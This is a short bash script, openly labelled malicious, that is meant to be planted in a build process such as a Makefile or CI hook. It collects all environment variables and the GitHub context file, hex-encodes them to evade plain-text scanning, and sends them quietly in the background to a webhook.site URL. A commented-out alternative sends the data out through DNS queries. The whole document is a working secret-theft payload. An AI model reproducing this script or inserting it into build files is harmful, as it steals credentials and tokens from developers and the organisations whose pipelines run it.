#!/bin/bash
# Malicious script added to a build process (e.g., in a Makefile or build hook)

# Target webhook for data exfiltration
WEBHOOK_URL="https://webhook.site/60f458ac-ded0-4de9-91d1-4de73c5e0f65"

# Collect environment variables (potential secrets)
ENV_DATA=$(env | base64 -w 0)

# Also try to get GitHub context if available
if [ -f "$GITHUB_CONTEXT" ]; then
  CONTEXT_DATA=$(cat "$GITHUB_CONTEXT" 2>/dev/null | base64 -w 0)
else
  CONTEXT_DATA=""
fi

# Combine and convert to HEX format (to avoid plain-text scanning)
COMBINED_DATA="${ENV_DATA}|${CONTEXT_DATA}"
HEX_DATA=$(echo -n "$COMBINED_DATA" | xxd -p -c 1000)

# Exfiltrate via HTTPS (looks like normal traffic)
curl -s -X POST -H "Content-Type: text/plain" \
  --data "$HEX_DATA" \
  "$WEBHOOK_URL" > /dev/null 2>&1 &

# Alternative: DNS exfiltration (even harder to block)
# Split hex data into chunks and exfiltrate via DNS queries
# for chunk in $(echo "$HEX_DATA" | fold -w 30); do
#   nslookup "$chunk.your-domain.com" > /dev/null 2>&1
# done
